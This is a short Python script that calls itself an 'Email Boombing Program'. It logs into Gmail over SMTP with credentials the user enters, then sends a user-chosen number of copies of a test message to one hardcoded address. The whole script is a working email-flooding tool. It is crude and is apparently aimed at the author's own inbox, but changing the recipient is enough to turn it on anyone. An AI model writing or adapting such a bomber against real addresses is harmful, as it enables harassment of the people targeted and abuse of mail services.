import smtplib # for sending email using SMTP
from getpass import getpass # for securely input password

print("\n\n..:: Welcome to the Email Boombing Program ::..\n")
print("=" * 50)

# Set up the SMTP server
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# Input email and password securely
email = input("\n..:: Enter your email\t\t\t: ")
password = getpass("\n..:: Enter your email's app password\t: ")
n = int(input("\n..:: Enter the number of emails to send\t: "))

server.login(email, password)

# Message to be sent
msg = "Hello, this is a test email!"

print()
# Send the email n times
for i in range(n):
    server.sendmail(email, "sagarbiswas.sb76@gmail.com", msg)
    print(f"\t==> Email {i + 1} sent successfully!")
# Quit the server
print("\n")
server.quit()

